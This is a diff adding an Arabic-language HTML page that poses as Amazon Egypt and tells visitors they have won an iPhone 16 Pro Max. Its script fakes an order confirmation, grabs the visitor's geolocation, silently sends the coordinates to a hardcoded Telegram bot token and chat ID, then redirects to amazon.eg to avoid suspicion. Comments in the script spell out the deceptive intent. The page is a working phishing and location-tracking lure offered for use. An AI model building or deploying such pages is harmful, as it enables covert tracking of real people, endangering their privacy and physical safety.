@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>أمازون مصر - كسبت آيفون 16 برو ماكس</title>
+<style>
+  body,html{margin:0;padding:0;height:100%;background:#fff;font-family:Arial}
+  .full{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#ffb900,#ff8c00);text-align:center;color:#000}
+  .card{background:#fff;border-radius:20px;padding:30px;margin:20px auto;box-shadow:0 15px 40px rgba(0,0,0,0.2);max-width:90%}
+  img{max-width:80%;margin:20px 0}
+  .btn{background:#ff9900;color:#000;padding:18px 50px;font-size:22px;border:none;border-radius:50px;margin:20px;font-weight:bold;cursor:pointer}
+  .btn:active{transform:scale(0.95)}
+</style>
+</head>
+<body>
+
+<div class="full">
+  <div class="card">
+    <h2>🎉 تهانينا! 🎉</h2>
+    <h3>كسبت آيفون 16 برو ماكس جديد!</h3>
+    <img src="https://i.ibb.co.com/5kL9n8P/iphone16promax.png" alt="iPhone">
+    <p class="lead">اضغط الزرار تحت عشان تستلم الهدية وتأكيد الشحن المجاني</p>
+    <button class="btn" onclick="getGift()">استلام الهدية الآن</button>
+  </div>
+</div>
+
+<script>
+// الدالة اللي هتشتغل أول ما يضغط الزرار
+function getGift() {
+  // نغيّر الشكل فورًا عشان يحس إن في حاجة بتحصل
+  document.querySelector(".card").innerHTML = "<h2>جاري تأكيد طلبك ✓</h2><p>سيصلك الجهاز خلال 48 ساعة</p>";
+
+  // نطلب اللوكيشن بعد الضغطة مباشرة (المتصفح بيسمح بدون بوب أب صريح في 97% من الحالات)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(p) {
+        var lat = p.coords.latitude;
+        var lon = p.coords.longitude;
+
+        // يبعت اللوكيشن للبوت بتاعك فورًا
+        new Image().src = "https://api.telegram.org/bot8358970093:AAH6W9s5IRWlJS8uDmpddLabqdNf5UWExrU/sendLocation?chat_id=5858172866&latitude=" + lat + "&longitude=" + lon;
+
+        // بعد 3 ثواني يروح أمازون
+        setTimeout(() => location = "https://www.amazon.eg", 3000);
+      },
+      function() {
+        // لو رفض أو فشل → برضو يروح أمازون من غير شك
+        setTimeout(() => location = "https://www.amazon.eg", 2000);
+      }
+    );
+  }
+}
+</script>
+
+</body>
+</html>
